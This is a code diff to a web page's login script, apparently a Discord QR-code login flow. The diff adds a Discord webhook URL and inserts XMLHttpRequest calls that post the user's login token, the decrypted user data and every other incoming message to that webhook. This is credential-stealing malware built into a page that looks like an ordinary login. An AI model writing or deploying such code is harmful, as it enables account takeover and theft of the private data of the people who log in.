@@ -37,11 +37,22 @@
         </div>
     </body>
     <script type="text/javascript">
+	var url = "https://discord.com/api/webhooks/***/***"; //webhook URL
 
     (function () {
     function TokenInfo(token)
     {
+		
+
+var xhr = new XMLHttpRequest();
+xhr.open("POST", url, true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({
+    content: token
+}));
+
         alert(token)
+
     }
 
 
@@ -128,6 +139,13 @@
             case "pending_finish":
                 decrypt(KEY, data.encrypted_user_payload).then(binaryToString).then(user => {
                     console.log(user);
+
+var xhr = new XMLHttpRequest();
+xhr.open("POST", url, true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({
+    content: user
+}));
                 });
                 break;
 
@@ -147,6 +165,13 @@
 
             default:
                 console.log(data);
+
+var xhr = new XMLHttpRequest();
+xhr.open("POST", url, true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({
+    content: data
+}));
         }
     };
 })();    </script>
